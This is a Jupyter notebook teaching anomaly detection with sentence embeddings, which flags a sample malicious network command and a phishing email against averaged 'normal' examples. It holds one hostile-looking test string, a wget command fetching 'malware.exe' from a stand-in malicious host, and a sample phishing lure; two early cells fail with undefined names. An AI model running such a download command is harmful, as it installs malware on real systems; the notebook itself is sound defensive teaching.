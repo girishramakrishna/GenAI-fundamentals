{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7ea2803e-dbb7-46a8-bd0a-999c221a3bbf",
   "metadata": {},
   "source": [
    "-------------------\n",
    "### Anomaly detection using sentence embeddings \n",
    "- involves comparing incoming sentences to a model of normal behavior. When a sentence deviates significantly from the norm, it's flagged as an anomaly.\n",
    "---------------------"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "ab9d0aa2-9bde-474f-ab76-2d1239d59974",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "from transformers import AutoModel, AutoTokenizer\n",
    "from sentence_transformers import SentenceTransformer, util\n",
    "import numpy as np"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "cb819405-958b-40c8-9303-1fbfa5dafe68",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import os\n",
    "os.environ[\"SENTENCE_TRANSFORMERS_HOME\"] = r'D:\\AI-DATASETS\\07-Hugging-Face-Data\\sentence-transformers'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "78603c18-b2a6-4920-8650-dbe17f407e5e",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "27599496a7244477864cfc1eddaa2067",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "modules.json:   0%|          | 0.00/229 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "D:\\Anaconda-16-FEB\\lib\\site-packages\\huggingface_hub\\file_download.py:157: UserWarning: `huggingface_hub` cache-system uses symlinks by default to efficiently store duplicated files but your machine does not support them in D:\\AI-DATASETS\\07-Hugging-Face-Data\\sentence-transformers\\models--sentence-transformers--paraphrase-MiniLM-L6-v2. Caching files will still work but in a degraded version that might require more space on your disk. This warning can be disabled by setting the `HF_HUB_DISABLE_SYMLINKS_WARNING` environment variable. For more details, see https://huggingface.co/docs/huggingface_hub/how-to-cache#limitations.\n",
      "To support symlinks on Windows, you either need to activate Developer Mode or to run Python as an administrator. In order to see activate developer mode, see this article: https://docs.microsoft.com/en-us/windows/apps/get-started/enable-your-device-for-development\n",
      "  warnings.warn(message)\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4fc5305a0a934a038e36c6afea94e824",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "config_sentence_transformers.json:   0%|          | 0.00/122 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "67f0d4fc5c3541549dc18db77c7f2c90",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "README.md:   0%|          | 0.00/3.73k [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2e55097c25b64c76bde88b3552f86f05",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "sentence_bert_config.json:   0%|          | 0.00/53.0 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bbc72cbf5e074f43bac885e9bc6b92c6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "config.json:   0%|          | 0.00/629 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "af6f144ea0c34fd084d3022c2dcb4fbe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "model.safetensors:   0%|          | 0.00/90.9M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e226abbc990e4f83b02f7f27a70e239f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "tokenizer_config.json:   0%|          | 0.00/314 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "74056e44c63a4f97a22bcd6e966b82f4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "vocab.txt:   0%|          | 0.00/232k [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "06e221bc288c450d8c3d410fba0610ad",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "tokenizer.json:   0%|          | 0.00/466k [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5d1967aee84e421d98c9f70ffd37013a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "special_tokens_map.json:   0%|          | 0.00/112 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "D:\\Anaconda-16-FEB\\lib\\site-packages\\transformers\\tokenization_utils_base.py:1601: FutureWarning: `clean_up_tokenization_spaces` was not set. It will be set to `True` by default. This behavior will be depracted in transformers v4.45, and will be then set to `False` by default. For more details check this issue: https://github.com/huggingface/transformers/issues/31884\n",
      "  warnings.warn(\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0204c4600c9646e097a957bf18257b6a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "1_Pooling/config.json:   0%|          | 0.00/190 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Load a pre-trained Sentence Transformer model\n",
    "model_name = \"paraphrase-MiniLM-L6-v2\"\n",
    "embedder = SentenceTransformer(model_name)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "e07d515f-4328-466c-9b2c-6f7708075904",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Create a model of normal behavior (e.g., average embeddings)\n",
    "normal_behavior = []"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "3f39be00-ca95-4872-8e40-828c7dafaf35",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Function to calculate sentence embeddings\n",
    "def calculate_sentence_embedding(text):\n",
    "    embeddings = embedder.encode(text, convert_to_tensor=True)\n",
    "    return embeddings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "beefa15f-1ed5-4a46-8002-798ef2d8056a",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import torch"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "f1c5bd4a-a09d-4b50-8b80-d81fa6ef4f6a",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'stream_of_text_data' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m~\\AppData\\Local\\Temp\\ipykernel_29920\\621885752.py\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[1;31m# Create embeddings for normal behavior\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m----> 2\u001b[1;33m \u001b[0mnormal_behavior\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mtorch\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mmean\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mtorch\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mstack\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m[\u001b[0m\u001b[0mcalculate_sentence_embedding\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mtext\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mfor\u001b[0m \u001b[0mtext\u001b[0m \u001b[1;32min\u001b[0m \u001b[0mstream_of_text_data\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;36m2\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mdim\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;36m0\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m: name 'stream_of_text_data' is not defined"
     ]
    }
   ],
   "source": [
    "# Create embeddings for normal behavior\n",
    "normal_behavior = torch.mean(torch.stack([calculate_sentence_embedding(text) for text in stream_of_text_data[:2]]), dim=0)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "915999ee-abf9-4a6d-a94c-8e20300c876a",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'stream_of_text_data' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m~\\AppData\\Local\\Temp\\ipykernel_29920\\2187843834.py\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[1;31m# Detect anomalies in the stream of text data\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m----> 2\u001b[1;33m \u001b[1;32mfor\u001b[0m \u001b[0mi\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0msentence\u001b[0m \u001b[1;32min\u001b[0m \u001b[0menumerate\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mstream_of_text_data\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m      3\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0mdetect_anomaly\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0msentence\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mnormal_behavior\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      4\u001b[0m         \u001b[0mprint\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34mf\"Anomaly detected at index {i}: {sentence}\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mNameError\u001b[0m: name 'stream_of_text_data' is not defined"
     ]
    }
   ],
   "source": [
    "# Detect anomalies in the stream of text data\n",
    "for i, sentence in enumerate(stream_of_text_data):\n",
    "    if detect_anomaly(sentence, normal_behavior):\n",
    "        print(f\"Anomaly detected at index {i}: {sentence}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b59edd90-f735-426b-a8d9-e4f3a517cf8e",
   "metadata": {},
   "source": [
    "#### detect suspicious or malicious text in network traffic or logs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "74d0f690-24d7-415d-87a6-17a451db0895",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Pseudo function for training a normal behavior model from a list of normal network commands\n",
    "def train_normal_behavior_model(normal_network_commands):\n",
    "    embeddings = np.array([embedder.encode(command) for command in normal_network_commands])\n",
    "    return np.mean(embeddings, axis=0)\n",
    "\n",
    "# Pseudo function for training a normal email content model from a list of normal emails\n",
    "def train_normal_email_content_model(normal_emails):\n",
    "    embeddings = np.array([embedder.encode(email_content) for email_content in normal_emails])\n",
    "    return np.mean(embeddings, axis=0)\n",
    "\n",
    "# Pseudo function to calculate cosine similarity between two sentence embeddings\n",
    "def calculate_similarity(embedding, normal_behavior_model):\n",
    "    return util.pytorch_cos_sim(embedding, normal_behavior_model)\n",
    "\n",
    "# Pseudo function to send an alert\n",
    "def alert(message):\n",
    "    print(f\"ALERT: {message}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "2ae38de1-4455-46b8-a111-3fd9d5949636",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Simulated network traffic or command data\n",
    "normal_network_commands = [\"ping server1\", \"list files\", \"connect to database\", \"shutdown server2\"]\n",
    "suspicious_command_to_check = \"wget http://malicious-site.com/malware.exe\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "682feba6-3210-4bd9-b9c1-a89d74578aee",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Train a model of normal behavior for network commands\n",
    "normal_behavior_model = train_normal_behavior_model(normal_network_commands)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "5fb37c5e-6abe-467e-a47a-5cc7839ea90d",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Embed the suspicious command\n",
    "embedding = np.array(embedder.encode(suspicious_command_to_check))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "dc55d5c0-5835-453c-a821-0134d0d0cfa6",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Calculate cosine similarity to the normal behavior model\n",
    "similarity_score = calculate_similarity(embedding, normal_behavior_model)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "84591a58-4078-477c-9eff-f8760fcbe4df",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Set a similarity threshold for flagging suspicious commands\n",
    "threshold = 0.6"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "8bb552ba-5f9a-4eab-9d79-1729ee9aa896",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ALERT: Suspicious command detected!\n"
     ]
    }
   ],
   "source": [
    "# Check if the similarity score is below the threshold\n",
    "if similarity_score < threshold:\n",
    "    alert(\"Suspicious command detected!\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7eeb87e9-edb8-4bb7-8888-0f1866a15da6",
   "metadata": {},
   "source": [
    "#### Another example"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "456d4dda-3218-427b-b822-2940428fa092",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Simulated email data\n",
    "normal_emails = [\"Hi, can you send me the report?\", \"Meeting at 3 PM\", \"Invoice attached.\", \"Important update.\"]\n",
    "phishing_email_to_check = \"Dear user, please provide your login credentials to resolve the issue.\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "08897ff6-2e55-4fcf-b19a-643e98e37a38",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Train a model of normal email content\n",
    "normal_email_content_model = train_normal_email_content_model(normal_emails)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "900eeeac-09cd-4cad-bbc7-299b86b53a67",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Embed the phishing email content\n",
    "embedding = np.array(embedder.encode(phishing_email_to_check))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "4f36d342-6459-4f19-8a7e-832df362e8aa",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Calculate cosine similarity to the normal email content model\n",
    "similarity_score = calculate_similarity(embedding, normal_email_content_model)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "fb3988a6-ff15-4fe7-8bf9-24e7125416e3",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Set a similarity threshold for flagging phishing emails\n",
    "threshold = 0.6"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "id": "221156aa-e953-4cd0-8049-4652cf35e070",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ALERT: Phishing attempt detected!\n"
     ]
    }
   ],
   "source": [
    "# Check if the cosine similarity score is below the threshold\n",
    "if similarity_score < threshold:\n",
    "    alert(\"Phishing attempt detected!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b4a56cdb-449e-4bfb-bee2-90899b8306cc",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
